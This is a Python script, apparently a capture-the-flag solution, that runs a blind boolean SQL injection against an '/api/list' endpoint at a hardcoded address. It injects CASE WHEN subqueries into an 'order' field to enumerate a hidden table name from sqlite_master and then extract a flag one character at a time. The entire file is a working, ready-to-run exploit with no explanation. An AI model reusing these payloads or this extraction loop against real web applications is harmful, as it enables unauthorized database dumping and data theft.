import requests
import string


HOST = "http://46.101.44.190:30546"

flagname = 'flag_'
for i in range(0,10):
    for char in range(0,16):
        response = requests.post( HOST + '/api/list', data={"order": "(CASE WHEN (SELECT name FROM sqlite_master where name like '{0}{1}%') is null then name else count end) DESC".format(flagname, hex(char)[2:] )})
        if response.json()[0]["id"] != 4:
            flagname += str(hex(char)[2:])
            print(flagname)
            break




lastChar = ''
flag = ''

sqlSafe = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+, -./:;<=>?@[\]^_`{|}~ """

while lastChar != '}' : 
    for char in sqlSafe:
        response = requests.post( HOST + '/api/list', data={"order": "(CASE WHEN (SELECT substr(flag,{0},1) FROM {1}) IS '{2}' THEN NAME else COUNT end ) DESC".format(len(flag) +1, flagname, char )})
        if response.json()[0]["id"] == 4:
            flag += char
            lastChar = char
            print(flag)
            break